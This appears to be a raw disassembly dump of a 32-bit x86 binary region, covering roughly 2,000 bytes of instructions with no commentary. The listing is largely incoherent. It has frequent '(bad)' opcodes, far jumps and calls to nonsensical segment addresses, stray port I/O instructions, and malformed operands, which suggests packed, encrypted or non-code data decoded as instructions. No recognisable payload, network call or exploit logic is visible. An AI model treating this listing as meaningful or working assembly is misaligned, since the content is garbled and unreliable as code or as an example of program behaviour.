  4093f8:	adc    eax,0xc87b01a6
  4093fd:	psubusw mm0,mm7
  409400:	and    DWORD PTR [esi+0x2791f01],ebp
  409406:	mov    bh,0x75
  409408:	(bad)  
  409409:	xor    eax,0x3894c844
  40940e:	lock sub DWORD PTR [ecx],ebx
  409411:	dec    eax
  409412:	add    DWORD PTR [ebp+0xd985ab5],esi
  409418:	sahf   
  409419:	imul   esp,DWORD PTR [ebx-0x73],0x78
  40941d:	jl     0x409454
  40941f:	cmp    BYTE PTR [edi+0x46],0x5b
  409423:	add    BYTE PTR [ebx+0x7025e8f1],cl
  409429:	ins    BYTE PTR es:[edi],dx
  40942a:	adc    al,0x5f
  40942c:	jle    0x40945a
  40942e:	aad    0xb9
  409430:	mov    al,ds:0x6e98f606
  409435:	pusha  
  409436:	fs sbb ch,al
  409439:	sub    DWORD PTR [esi+0x4b],esp
  40943c:	xchg   edx,eax
  40943d:	adc    al,0x1d
  40943f:	iret   
  409440:	and    BYTE PTR [eax+0x3ee0b1f0],bl
  409446:	lds    ebp,FWORD PTR [edx]
  409448:	mov    al,ds:0x54d456ce
  40944d:	jns    0x409440
  40944f:	sbb    edx,DWORD PTR [eax-0x7d]
  409452:	cs or  eax,0x31a18d5d
  409458:	and    DWORD PTR [ecx+ebp*2],esi
  40945b:	push   edi
  40945c:	jmp    0x52f5:0x9b61b6ac
  409463:	test   ch,bl
  409465:	sbb    BYTE PTR [ebx+0x5338cd3b],ah
  40946b:	add    DWORD PTR [ebp-0xa01d773],edx
  409471:	pop    ds
  409472:	dec    esi
  409473:	jns    0x4094bc
  409475:	sbb    DWORD PTR [ebx+0x3c29ced0],0x1f
  40947c:	xchg   esi,eax
  40947d:	adc    al,0x2c
  40947f:	mov    eax,0x4066bda3
  409484:	inc    eax
  409485:	(bad)  
  409486:	mov    bl,0xdc
  409488:	mov    eax,ds:0xce043285
  40948d:	and    eax,ebp
  40948f:	xlat   BYTE PTR ds:[ebx]
  409490:	into   
  409491:	sbb    DWORD PTR [ebp+0x465b459f],eax
  409497:	or     DWORD PTR [ecx+0x69a65218],0x3a115d20
  4094a1:	sbb    BYTE PTR ds:0xd9749c7e,al
  4094a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094a8:	popf   
  4094a9:	and    DWORD PTR [ebp+0x41],eax
  4094ac:	jo     0x409480
  4094ae:	jmp    0x7d40f4cd
  4094b3:	pop    ebx
  4094b4:	jmp    0x3575d737
  4094b9:	inc    edx
  4094ba:	retf   
  4094bb:	mov    bl,0x15
  4094bd:	jae    0x409539
  4094bf:	mov    bl,0xc8
  4094c1:	in     eax,dx
  4094c2:	fnstsw WORD PTR [ecx-0x56]
  4094c5:	mov    bl,0x69
  4094c7:	pop    ebx
  4094c8:	jge    0x40953e
  4094ca:	pop    edi
  4094cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094cc:	jl     0x40946a
  4094ce:	shl    DWORD PTR [edi-0x531fe5f7],cl
  4094d4:	shl    BYTE PTR [ebx-0x56],1
  4094d7:	adc    DWORD PTR [ebx-0x68],edi
  4094da:	xchg   edi,eax
  4094db:	dec    esi
  4094dc:	inc    ebx
  4094dd:	push   ebp
  4094de:	dec    eax
  4094df:	popa   
  4094e0:	je     0x4094e2
  4094e2:	(bad)  
  4094e3:	sub    DWORD PTR [ebx-0x43f9dbfe],eax
  4094e9:	fisub  DWORD PTR [esi+edi*4+0x64c3f4de]
  4094f0:	and    edi,DWORD PTR [edx-0x3]
  4094f3:	jle    0x409560
  4094f5:	fsub   st(0),st
  4094f7:	fnstsw WORD PTR [edi-0x3ba9bad4]
  4094fd:	dec    ecx
  4094fe:	loope  0x4094fb
  409500:	xor    bh,BYTE PTR [eax]
  409502:	xchg   DWORD PTR [esi],edi
  409504:	adc    BYTE PTR [eax],cl
  409506:	and    BYTE PTR [ebp+0x5a],0xf0
  40950a:	inc    edi
  40950b:	cmp    DWORD PTR [edx],esp
  40950d:	ins    BYTE PTR es:[edi],dx
  40950e:	mov    dh,0x96
  409510:	adc    DWORD PTR [ecx+0x6b7d1010],edi
  409516:	cmp    esi,esi
  409518:	and    BYTE PTR [eax-0x49],bh
  40951b:	rol    DWORD PTR [esi-0x66],0xc9
  40951f:	xchg   esp,eax
  409520:	lock test eax,0xa36b29a3
  409526:	cmp    al,0x6a
  409528:	jmp    0xb1d71b53
  40952d:	push   ebp
  40952e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40952f:	out    dx,al
  409530:	out    0x28,al
  409532:	and    esp,DWORD PTR [eax]
  409534:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409535:	jmp    0x409581
  409537:	adc    esi,ebx
  409539:	and    DWORD PTR [ecx-0xa05a052],edi
  40953f:	ss pop ds
  409541:	xor    eax,0x43aa1857
  409546:	aaa    
  409547:	mov    ah,BYTE PTR [esi]
  409549:	test   ecx,ebx
  40954b:	stos   BYTE PTR es:[edi],al
  40954c:	retf   
  40954d:	sbb    eax,0x2f5fdb8d
  409552:	cwde   
  409553:	mov    al,0x3d
  409555:	xchg   ebp,eax
  409556:	test   eax,0x154298a
  40955b:	dec    esp
  40955c:	sub    eax,DWORD PTR [edi-0x80]
  40955f:	test   al,0x59
  409561:	inc    edx
  409562:	inc    edi
  409563:	xchg   DWORD PTR [ebp-0x5b],edi
  409566:	and    eax,0xf12051ec
  40956b:	hlt    
  40956c:	sbb    DWORD PTR [eax-0x15],0xffffff99
  409570:	and    eax,0x8909fde7
  409575:	rol    DWORD PTR [edx+0x38],1
  409578:	and    BYTE PTR [edi+0x53],0x74
  40957c:	lods   eax,DWORD PTR ds:[esi]
  40957d:	mov    ah,BYTE PTR [ecx+ebx*2-0x6c]
  409581:	add    ecx,edi
  409583:	pop    ebp
  409584:	ins    DWORD PTR es:[edi],dx
  409585:	aaa    
  409586:	repz call 0xb807:0x27b939ef
  40958e:	mov    ah,0x46
  409590:	xor    dl,BYTE PTR [eax+0x32]
  409593:	fdivr  DWORD PTR [esi]
  409595:	adc    DWORD PTR [esi-0x21923e9e],edi
  40959b:	leave  
  40959c:	or     ebp,esi
  40959e:	jecxz  0x409563
  4095a0:	sbb    DWORD PTR [ecx+ebx*4+0x72],edi
  4095a4:	mov    dl,BYTE PTR es:[esi+0x3b]
  4095a8:	mov    al,ds:0x283e310c
  4095ad:	dec    edi
  4095ae:	adc    DWORD PTR [ebx],0x8ec56133
  4095b4:	adc    BYTE PTR [edx],ah
  4095b6:	jl     0x409626
  4095b8:	xor    al,0x3e
  4095ba:	mov    ?,WORD PTR [esi-0x6ce7090c]
  4095c0:	pshufw mm3,QWORD PTR [esi+0xd0824ef],0xad
  4095c8:	or     BYTE PTR [ecx+0x588cd262],0x40
  4095cf:	imul   DWORD PTR [edi]
  4095d1:	push   edx
  4095d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095d3:	jno    0x4095ed
  4095d5:	jmp    0x49d5569a
  4095da:	or     DWORD PTR [eax-0x26],ebp
  4095dd:	mov    edx,0xca61ca6e
  4095e2:	pop    ecx
  4095e3:	lahf   
  4095e4:	jae    0x4095b0
  4095e6:	pop    edi
  4095e7:	sbb    DWORD PTR [ebp-0x75],esp
  4095ea:	adc    dh,al
  4095ec:	scas   eax,DWORD PTR es:[edi]
  4095ed:	es loopne 0x409657
  4095f0:	push   cs
  4095f1:	add    al,0x2e
  4095f3:	mov    bl,0x51
  4095f5:	jns    0x4095f4
  4095f7:	ds cwde 
  4095f9:	sbb    ecx,DWORD PTR [edi+ebp*2-0x5a]
  4095fd:	pop    ecx
  4095fe:	push   ss
  4095ff:	out    dx,eax
  409600:	jmp    0x4095b0
  409602:	sub    DWORD PTR [edx+0x3b],ebx
  409605:	jo     0x4095e5
  409607:	das    
  409608:	in     al,0xb9
  40960a:	dec    esp
  40960b:	lods   al,BYTE PTR ds:[esi]
  40960c:	js     0x409620
  40960e:	std    
  40960f:	sbb    DWORD PTR [ecx+0x6c],esp
  409612:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409613:	xchg   ebp,eax
  409614:	out    dx,eax
  409615:	test   BYTE PTR [esi+0xa766088],dh
  40961b:	sub    BYTE PTR [edx+esi*4+0x18],dl
  40961f:	xchg   BYTE PTR [edi+0x1a7b57d5],dl
  409625:	push   eax
  409626:	lods   al,BYTE PTR ds:[esi]
  409627:	inc    eax
  409628:	xchg   ebx,eax
  409629:	sti    
  40962a:	or     DWORD PTR [ebp-0x75],ebp
  40962d:	jnp    0x4095c9
  40962f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409630:	adc    bh,BYTE PTR [edx+0x33859716]
  409636:	test   BYTE PTR [edx-0xd],0x80
  40963a:	aad    0xdf
  40963c:	sti    
  40963d:	std    
  40963e:	mov    ch,0xa7
  409640:	push   0x2c
  409642:	mov    ch,0xea
  409644:	mov    esi,0xb44b06b1
  409649:	std    
  40964a:	dec    esp
  40964b:	pop    ss
  40964c:	enter  0x4f10,0x5b
  409650:	mov    edi,0x4b327ad5
  409655:	fwait
  409656:	into   
  409657:	ja     0x409603
  409659:	mov    eax,DWORD PTR [esi-0x693b9e73]
  40965f:	dec    esi
  409660:	push   eax
  409661:	xchg   edx,eax
  409662:	mov    cl,BYTE PTR [eax+0x14]
  409665:	pop    edx
  409666:	imul   ebx,DWORD PTR [ebp+edi*8+0x51c29457],0xffffffd9
  40966e:	out    dx,al
  40966f:	add    BYTE PTR [edx],ch
  409671:	in     al,dx
  409672:	xor    al,0xcf
  409674:	mov    DWORD PTR [eax+0x35],edx
  409677:	adc    dl,ch
  409679:	mov    ebp,0xe28469ab
  40967e:	push   edx
  40967f:	sbb    al,0xb3
  409681:	jmp    0x4096fb
  409683:	xchg   esp,eax
  409684:	shl    DWORD PTR [eax-0xb],cl
  409687:	push   cs
  409688:	pop    ecx
  409689:	sbb    al,0xab
  40968b:	shr    bl,0xc5
  40968e:	and    BYTE PTR [eax],al
  409690:	(bad)  
  409691:	je     0x4096f3
  409693:	enter  0xa5f9,0x80
  409697:	adc    al,cl
  409699:	frstor [esi+edx*2-0x27]
  40969d:	int3   
  40969e:	and    al,0x86
  4096a0:	dec    ebp
  4096a1:	(bad)  
  4096a2:	in     al,dx
  4096a3:	and    al,0x76
  4096a5:	pop    ss
  4096a6:	leave  
  4096a7:	push   edx
  4096a8:	and    al,BYTE PTR [eax]
  4096aa:	sbb    DWORD PTR [edx],esp
  4096ac:	xchg   ecx,eax
  4096ae:	loope  0x4096ce
  4096b0:	mov    ecx,DWORD PTR [ebp-0x14]
  4096b3:	jmp    0x409c3d
  4096b8:	out    0x84,eax
  4096ba:	inc    ebx
  4096bb:	mov    bl,BYTE PTR [eax]
  4096bd:	push   eax
  4096be:	sahf   
  4096bf:	pop    eax
  4096c0:	sub    DWORD PTR [ecx+0x78bcb254],edx
  4096c6:	push   0x162dd472
  4096cb:	push   ss
  4096cc:	cmp    eax,0x9b161604
  4096d1:	(bad)  
  4096d2:	pushf  
  4096d3:	out    0xf2,al
  4096d5:	aaa    
  4096d6:	mov    cl,BYTE PTR [esi]
  4096d8:	lods   al,BYTE PTR ds:[esi]
  4096d9:	fwait
  4096da:	mov    eax,DWORD PTR [esi-0x4a]
  4096dd:	jno    0x40968e
  4096df:	jl     0x40966b
  4096e1:	sbb    DWORD PTR [ebx+eiz*4-0x2d149a45],edi
  4096e8:	mov    dh,0xbb
  4096ea:	fmul   st(0),st
  4096ec:	push   ds
  4096ed:	jnp    0x409746
  4096ef:	add    cl,BYTE PTR [edi]
  4096f1:	xchg   edx,eax
  4096f2:	mov    esi,0xd6d905aa
  4096f7:	fidiv  DWORD PTR [eax-0x6ac5796b]
  4096fd:	lods   al,BYTE PTR ds:[esi]
  4096fe:	cli    
  4096ff:	jle    0x409772
  409701:	adc    bh,dl
  409703:	push   es
  409704:	jmp    0xce0e:0x58ddf073
  40970b:	xchg   esi,eax
  40970c:	xor    edi,esi
  40970e:	cmp    al,0x3b
  409710:	nop
  409711:	xor    eax,esi
  409713:	jmp    0x5802:0x5ae9636c
  40971a:	call   0x4251bcc2
  40971f:	les    ebx,FWORD PTR [esi-0x20]
  409722:	mov    dh,0x2f
  409724:	jae    0x409768
  409726:	ror    DWORD PTR [edx+ecx*2],0xa
  40972a:	stos   DWORD PTR es:[edi],eax
  40972b:	xchg   edi,eax
  40972c:	mov    bh,0xd6
  40972e:	dec    esi
  40972f:	sti    
  409730:	inc    edx
  409731:	inc    ebx
  409732:	push   edx
  409733:	add    DWORD PTR [ebx],ecx
  409735:	fs lock pop ecx
  409738:	popa   
  409739:	push   0x693f89d5
  40973e:	sbb    eax,0x25818da0
  409743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409744:	jge    0x409743
  409746:	jl     0x4097a8
  409748:	jg     0x409712
  40974a:	imul   eax,DWORD PTR [edi],0xffffff94
  40974d:	int    0xb5
  40974f:	inc    esi
  409750:	not    BYTE PTR [ebx-0x2ff3b53a]
  409756:	mov    eax,ds:0xf5aff202
  40975b:	sbb    al,0xfe
  40975d:	outs   dx,DWORD PTR ds:[esi]
  40975e:	push   esi
  40975f:	add    al,0xf5
  409761:	retf   0x31c
  409764:	fmul   QWORD PTR [edi-0x7177603b]
  40976a:	or     dl,BYTE PTR [esi]
  40976c:	or     eax,0xd2a25b45
  409771:	xor    al,0x3
  409773:	mov    dh,0xfa
  409775:	enter  0x9a46,0x58
  409779:	dec    eax
  40977a:	or     DWORD PTR [ebp+0x39],ebp
  40977d:	test   DWORD PTR [ebp-0x80],0xc54fc50b
  409784:	enter  0xa341,0xde
  409788:	(bad)  
  409789:	fisubr DWORD PTR [edx+0x2b048f90]
  40978f:	pushf  
  409790:	cli    
  409791:	pop    ss
  409792:	sbb    bl,BYTE PTR [edi+0x20]
  409795:	call   DWORD PTR [ebx+0x18]
  409798:	jo     0x409762
  40979a:	mov    edi,DWORD PTR [edi-0x21]
  40979d:	inc    ebx
  40979e:	fdivr  QWORD PTR [ebp-0x15]
  4097a1:	mov    ebp,0x44e47d9a
  4097a6:	cmp    al,0xc9
  4097a8:	xor    dh,BYTE PTR [ebp-0x34]
  4097ab:	fcomip st,st(1)
  4097ad:	push   ss
  4097ae:	rcr    DWORD PTR [ebp+0x67],1
  4097b1:	mov    eax,0x6f02f0f8
  4097b6:	jb     0x409803
  4097b8:	mov    BYTE PTR [ecx-0x41],ah
  4097bb:	mov    al,0x81
  4097bd:	adc    BYTE PTR ds:0x359b47fc,bl
  4097c3:	call   0xd1ce:0x8e529ac2
  4097ca:	sbb    al,0x96
  4097cc:	mov    esi,0x195e808a
  4097d2:	loop   0x40982f
  4097d4:	adc    al,0x0
  4097d6:	dec    ebx
  4097d7:	sbb    BYTE PTR [ecx],0xfb
  4097da:	push   eax
  4097db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097dc:	and    esp,ebx
  4097de:	jbe    0x409798
  4097e0:	cmc    
  4097e1:	ror    DWORD PTR [eax],0x50
  4097e4:	xor    al,0x86
  4097e6:	cmp    al,0x11
  4097e8:	pop    eax
  4097e9:	loope  0x409779
  4097eb:	pop    ecx
  4097ec:	dec    eax
  4097ed:	and    BYTE PTR [eax],al
  4097ef:	jno    0x409774
  4097f1:	cmp    ch,BYTE PTR [eax]
  4097f3:	ds jns 0x4097ac
  4097f6:	hlt    
  4097f7:	clc    
  4097f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097f9:	adc    DWORD PTR [ebp+0x36c4fe06],edx
  4097ff:	test   DWORD PTR [ebx+0x506b3227],0xdc051fa8
  409809:	pop    ds
  40980a:	sbb    al,0x4
  40980c:	stc    
  40980d:	push   0xba4dd3da
  409812:	mov    ebp,0xeaeb2294
  409817:	dec    esp
  409818:	mov    ebx,0xb1662088
  40981d:	cs mov esp,0x4b4480db
  409823:	rol    ebx,0xb1
  409826:	dec    ebp
  409827:	retf   0x7921
  40982a:	iret   
  40982b:	sub    al,BYTE PTR [esi-0x3b]
  40982e:	push   0x1c0c00e2
  409833:	and    al,0xe9
  409835:	into   
  409836:	or     esp,DWORD PTR [ebx]
  409838:	loope  0x4097bd
  40983a:	stos   DWORD PTR es:[edi],eax
  40983b:	jae    0x4098b0
  40983d:	or     edi,ebp
  40983f:	add    al,0x26
  409841:	pop    ss
  409842:	and    al,0x45
  409844:	fmul   DWORD PTR [ebx-0x5d47c754]
  40984a:	sbb    eax,0xfd326d16
  40984f:	sar    BYTE PTR [ebx+0x7cdb7889],1
  409855:	lods   eax,DWORD PTR ds:[esi]
  409856:	push   edi
  409857:	das    
  409858:	xor    eax,0x8a591188
  40985d:	xor    DWORD PTR ds:0xfa7afcd5,eax
  409863:	scas   al,BYTE PTR es:[edi]
  409864:	fidiv  WORD PTR [esi-0x6763514c]
  40986a:	xor    al,0xf2
  40986c:	inc    BYTE PTR [edx+0x6a]
  40986f:	mov    dl,0x8f
  409871:	cmp    eax,0xbdf87204
  409876:	popf   
  409877:	sar    eax,0x97
  40987a:	out    0x61,al
  40987c:	(bad)  
  40987d:	loop   0x4098dc
  40987f:	lea    edi,[eax-0x6758d1c8]
  409885:	outs   dx,DWORD PTR gs:[esi]
  409887:	jbe    0x4098fd
  409889:	pusha  
  40988a:	pushf  
  40988b:	retf   0x6182
  40988e:	cdq    
  40988f:	jle    0x4098b4
  409891:	and    ah,BYTE PTR [esi]
  409893:	adc    al,0x47
  409895:	ret    
  409896:	sbb    DWORD PTR [edx+ebx*1-0x71],edi
  40989a:	sub    ecx,esp
  40989c:	xchg   BYTE PTR [edi],bh
  40989e:	in     eax,0x64
  4098a0:	dec    edx
  4098a1:	mov    ecx,0x60cd00d9
  4098a6:	inc    DWORD PTR [ebp-0x649b381e]
  4098ac:	lahf   
  4098ad:	push   eax
  4098ae:	aad    0xed
  4098b0:	dec    esi
  4098b1:	call   0x41ac:0xdb16f66d
  4098b8:	hlt    
  4098b9:	xchg   ebp,eax
  4098ba:	into   
  4098bb:	iret   
  4098bc:	xchg   ecx,eax
  4098bd:	xor    eax,DWORD PTR [edi-0xc]
  4098c0:	shl    BYTE PTR [edi+edx*1+0x57ed6a60],1
  4098c7:	dec    esi
  4098c8:	dec    ebp
  4098c9:	sub    al,0x95
  4098cb:	outs   dx,BYTE PTR ds:[esi]
  4098cc:	inc    ebp
  4098cd:	and    al,0x11
  4098cf:	pop    eax
  4098d0:	adc    al,0xa
  4098d2:	mov    WORD PTR [ecx],ss
  4098d4:	stc    
  4098d5:	inc    eax
  4098d6:	and    dh,ah
  4098d8:	in     eax,0x96
  4098da:	mov    ah,0x22
  4098dc:	stos   DWORD PTR es:[edi],eax
  4098dd:	sub    DWORD PTR [ebp-0x301d119d],eax
  4098e3:	adc    bh,al
  4098e5:	imul   ecx,DWORD PTR ds:0x6957cc90,0x2b
  4098ec:	xchg   esi,eax
  4098ed:	clc    
  4098ee:	and    al,0xdb
  4098f0:	jae    0x409879
  4098f2:	repnz sti 
  4098f4:	lods   al,BYTE PTR ds:[esi]
  4098f5:	imul   ecx,DWORD PTR [ebx+0xaf1bc00],0xdefd803b
  4098ff:	cmp    eax,0x961ea583
  409904:	xchg   edx,eax
  409905:	mov    esi,ecx
  409907:	cmp    ah,BYTE PTR ds:0xcebff0e2
  40990d:	mov    ebp,0x868da7a8
  409912:	adc    DWORD PTR [edi-0x753505e8],eax
  409918:	jge    0x4098ed
  40991a:	xor    ch,BYTE PTR [esi]
  40991c:	popf   
  40991d:	jae    0x4098c9
  40991f:	mov    ds:0x6bde0c15,al
  409924:	imul   edi,DWORD PTR [ebx+edi*8],0x62076b6e
  40992b:	xchg   dl,bh
  40992d:	mov    ds:0x69a84dfc,eax
  409932:	js     0x409958
  409934:	and    al,0x37
  409936:	adc    esi,eax
  409938:	pop    es
  409939:	ss (bad) 
  40993b:	jnp    0x4098bd
  40993d:	push   esp
  40993e:	out    dx,al
  40993f:	inc    eax
  409940:	mov    WORD PTR [eax*1-0x4d8c15f7],gs
  409947:	xor    esp,DWORD PTR [edi]
  409949:	stos   BYTE PTR es:[edi],al
  40994a:	test   al,0x76
  40994c:	mov    bl,0x6a
  40994e:	mov    al,0xf
  409950:	sbb    dl,BYTE PTR [eax-0x71]
  409953:	xchg   esi,eax
  409954:	inc    eax
  409955:	jo     0x40995b
  409957:	and    BYTE PTR [edx-0x2f],0x16
  40995b:	dec    eax
  40995c:	loop   0x409987
  40995e:	inc    ebp
  40995f:	and    BYTE PTR [ecx+0x4b],dl
  409962:	fucomip st,st(7)
  409964:	out    0x15,al
  409966:	mov    ch,0x2a
  409968:	jmp    0xb6cc61c
  40996d:	pushf  
  40996e:	data16 cli 
  409970:	inc    edi
  409971:	cmp    ch,BYTE PTR [eax-0xc2b0bdd]
  409977:	adc    esi,DWORD PTR [ebp-0x782a2cec]
  40997d:	push   ebx
  40997e:	adc    eax,0x99c1d966
  409983:	mov    ebx,0xe4116ef9
  409988:	mov    esp,0x66f08237
  40998d:	into   
  40998e:	jmp    0xfef6:0xf7d1fdc0
  409995:	sub    ebp,DWORD PTR [ecx+0x4fca3999]
  40999b:	enter  0xbd3a,0x68
  40999f:	and    ecx,esi
  4099a1:	xchg   DWORD PTR [ecx+eax*1],edi
  4099a4:	test   ax,0xb4be
  4099a8:	push   0xffffff97
  4099aa:	(bad)  
  4099ab:	adc    al,0xb9
  4099ad:	and    edi,DWORD PTR [edi-0x7]
  4099b0:	xchg   DWORD PTR [ebx-0x3b],ecx
  4099b3:	loopne 0x409966
  4099b5:	inc    ecx
  4099b6:	inc    esp
  4099b7:	retf   0xa26b
  4099ba:	or     eax,0x4734a561
  4099bf:	ror    bh,cl
  4099c1:	aas    
  4099c2:	xchg   edx,eax
  4099c3:	xbegin 0x169d0243
  4099c9:	and    al,0x2
  4099cb:	cmc    
  4099cc:	cmp    DWORD PTR [eax+0x57],0xde8d2957
  4099d3:	adc    al,0xa3
  4099d5:	sub    eax,0x285851d1
  4099da:	repz int 0x32
  4099dd:	mov    WORD PTR [edi+0x168f89c1],ss
  4099e3:	pop    ebx
  4099e4:	xor    al,0xf8
  4099e6:	ror    BYTE PTR [esi+0x5c],cl
  4099e9:	pop    esp
  4099ea:	push   eax
  4099eb:	adc    ecx,DWORD PTR [eax-0x66]
  4099ee:	jmp    0x409a1b
  4099f0:	inc    ebx
  4099f1:	inc    edi
  4099f2:	bound  edi,QWORD PTR [ebp-0x34a3ad33]
  4099f8:	shl    DWORD PTR [edi-0xc],1
  4099fb:	pop    edi
  4099fc:	fchs   
  4099fe:	mov    edx,0xa74d1a75
  409a03:	jmp    0x454e:0xa04e0488
  409a0a:	mov    ds:0x9b8b7cc3,eax
  409a0f:	dec    esi
  409a10:	fmul   QWORD PTR [ecx+0x4e]
  409a13:	ret    
  409a14:	sbb    al,0x1
  409a16:	in     al,0xde
  409a18:	or     edi,edi
  409a1a:	mov    ah,0x5b
  409a1c:	cmp    edi,ebx
  409a1e:	inc    ebp
  409a1f:	stc    
  409a20:	bound  eax,QWORD PTR [edi]
  409a22:	jmp    0x88fb:0xf3272c47
  409a29:	jmp    ebx
  409a2b:	or     DWORD PTR [edi],ebp
  409a2d:	repz cmp al,0x12
  409a30:	adc    al,0x7e
  409a32:	inc    edi
  409a33:	mov    esi,0x1bd1fe8e
  409a38:	lahf   
  409a39:	sti    
  409a3a:	bound  esp,QWORD PTR [esi-0x38]
  409a3d:	adc    edi,DWORD PTR [ebx-0x1b]
  409a40:	push   ds
  409a41:	jae    0x409a27
  409a43:	mov    cl,0xda
  409a45:	xchg   ebp,eax
  409a46:	in     eax,0x6
  409a48:	test   DWORD PTR [ebp+edi*1+0x34],esp
  409a4c:	cmp    al,0xec
  409a4e:	cdq    
  409a4f:	ret    
  409a50:	fist   DWORD PTR [edi]
  409a52:	pop    eax
  409a53:	sub    ah,BYTE PTR [ebx-0x3486aa2d]
  409a59:	lahf   
  409a5a:	dec    edi
  409a5b:	pop    esi
  409a5c:	xchg   ebx,eax
  409a5d:	(bad)  
  409a5f:	sub    ebx,DWORD PTR [esi+ecx*1+0x276d42fb]
  409a66:	fmul   DWORD PTR [eax-0x7e]
  409a69:	mov    edi,0xad54be02
  409a6e:	mov    WORD PTR [esi+ebp*1-0x76],?
  409a72:	inc    ebp
  409a73:	lods   eax,DWORD PTR ds:[esi]
  409a74:	and    al,BYTE PTR [eax-0x9fb5796]
  409a7a:	jae    0x409a41
  409a7c:	popf   
  409a7d:	dec    ebx
  409a7e:	daa    
  409a7f:	icebp  
  409a80:	xchg   ebx,eax
  409a81:	lds    edx,FWORD PTR [edx-0x3b8ac46e]
  409a87:	sub    dl,BYTE PTR [edx]
  409a89:	jno    0x409a4b
  409a8b:	scas   al,BYTE PTR es:[edi]
  409a8c:	cs pop ebp
  409a8e:	jp     0x409a86
  409a90:	xor    eax,0xb14f4151
  409a95:	call   0xdac8:0x7e265256
  409a9c:	mov    al,BYTE PTR [edx]
  409a9e:	fsubp  st(6),st
  409aa0:	(bad)  
  409aa1:	cld    
  409aa2:	mov    dh,0xa2
  409aa4:	xor    eax,0xa05b916
  409aa9:	imul   edx,DWORD PTR [ebx+0x359697f],0x58
  409ab0:	adc    al,0x4f
  409ab2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ab3:	pop    ebp
  409ab4:	mov    esp,0x26ba387a
  409ab9:	cmp    bl,BYTE PTR [ebp-0x25f6a8c6]
  409abf:	xchg   DWORD PTR [ebp+0x5f],esi
  409ac2:	aas    
  409ac3:	push   esp
  409ac4:	dec    edi
  409ac5:	and    al,0xd4
  409ac7:	cmp    DWORD PTR [ecx+edi*2+0x3cc45226],edx
  409ace:	bound  edx,QWORD PTR [edi-0x71]
  409ad1:	lds    edi,FWORD PTR [ecx+0xd12fe67]
  409ad7:	int3   
  409ad8:	ret    
  409ad9:	jo     0x409b4b
  409adb:	xlat   BYTE PTR ds:[ebx]
  409adc:	std    
  409add:	cdq    
  409ade:	(bad)  
  409adf:	pushf  
  409ae0:	adc    cl,BYTE PTR [edx+ecx*4]
  409ae3:	not    DWORD PTR [edx]
  409ae5:	sbb    eax,0xdc9960b5
  409aea:	and    BYTE PTR [ecx],ch
  409aec:	mov    esp,0x66399894
  409af1:	cmc    
  409af2:	test   DWORD PTR [edi],0x6059fb52
  409af8:	js     0x409b45
  409afa:	ret    
  409afb:	mov    bl,0x28
  409afd:	mov    dh,0x9f
  409aff:	xor    al,0x30
  409b01:	arpl   WORD PTR [edx-0x32eef78f],ax
  409b07:	sub    al,0xd9
  409b09:	xchg   ebx,eax
  409b0a:	dec    ebx
  409b0b:	dec    eax
  409b0c:	int    0x7e
  409b0e:	xor    dh,cl
  409b10:	jmp    0x409aeb
  409b12:	and    edi,edx
  409b14:	inc    esi
  409b15:	sub    al,0x76
  409b17:	cwde   
  409b18:	jo     0x409af0
  409b1a:	retf   
  409b1b:	xor    edx,DWORD PTR [ebx+0x45830576]
  409b21:	xor    eax,DWORD PTR [ebx]
  409b23:	(bad)  
  409b24:	call   esi
  409b26:	or     ah,BYTE PTR [esi+0x33]
  409b29:	dec    esi
  409b2a:	(bad)  
  409b2b:	jecxz  0x409ba5
  409b2d:	out    0x91,eax
  409b2f:	jmp    0xadbce728
  409b34:	shl    eax,1
  409b36:	pop    ds
  409b37:	mov    WORD PTR [edx+0x37],ss
  409b3a:	adc    BYTE PTR cs:[ecx-0x5b],al
  409b3e:	sbb    DWORD PTR [edx-0x28d5362f],eax
  409b44:	into   
  409b45:	pushf  
  409b46:	rcr    BYTE PTR [eax-0x79],cl
  409b49:	dec    ecx
  409b4a:	mov    ecx,0x8eac0ee3
  409b4f:	fist   WORD PTR [edx+esi*2]
  409b52:	lods   eax,DWORD PTR ds:[esi]
  409b53:	sahf   
  409b54:	sbb    eax,0xac4279a2
  409b59:	out    dx,al
  409b5a:	mov    ebp,0xf09447cf
  409b5f:	jmp    0x813d9f1e
  409b64:	and    dh,BYTE PTR [edi-0x5ff76ade]
  409b6a:	lock (bad) 
  409b6c:	xor    DWORD PTR [edi+eiz*1-0x34a34dce],ebx
  409b73:	daa    
  409b74:	push   0x103aa120
  409b79:	int3   
  409b7a:	cmp    al,0x45
  409b7c:	outs   dx,BYTE PTR ds:[esi]
  409b7d:	in     al,0xe7
  409b7f:	je     0x409b69
  409b81:	pop    esp
  409b82:	xchg   esp,eax
  409b83:	in     eax,dx
  409b84:	in     eax,0xc3
  409b86:	adc    dl,BYTE PTR [ecx]
  409b88:	into   
  409b89:	sub    eax,0xbe4c6011
  409b8e:	arpl   WORD PTR [edi+0x23006f6e],di
  409b94:	sar    dl,cl
  409b96:	sub    BYTE PTR [edx],cl
  409b98:	jbe    0x409bc9
  409b9a:	add    ebp,ecx
  409b9c:	in     eax,0x1c
  409b9e:	test   BYTE PTR [ecx+eax*1-0x355aeef8],ah
  409ba5:	jb     0x409bbb
  409ba7:	mov    dl,0xe
  409ba9:	push   es
  409baa:	repz fisttp QWORD PTR [edx]
  409bad:	movntsd QWORD PTR [edx+0xc],xmm1
  409bb2:	bound  ebx,QWORD PTR [si]
  409bb5:	dec    ebx
  409bb6:	aas    
  409bb7:	test   BYTE PTR [eax+0x52c12767],dh
  409bbd:	jns    0x409bc1
  409bbf:	rcr    DWORD PTR [ebp+esi*2-0x2988dc74],1
  409bc6:	addr16 mov bh,0x5e
  409bc9:	ja     0x409baa
  409bcb:	xor    DWORD PTR [ecx+0x3367bd4a],ebx
  409bd1:	and    al,0xcc
  409bd3:	xchg   ebx,eax
  409bd4:	pop    ebp
  409bd5:	pop    edi
  409bd6:	sbb    al,0xa4
  409bd8:	sub    BYTE PTR [edi-0x72],cl
  409bdb:	(bad)  
  409bdc:	sbb    al,0x6c
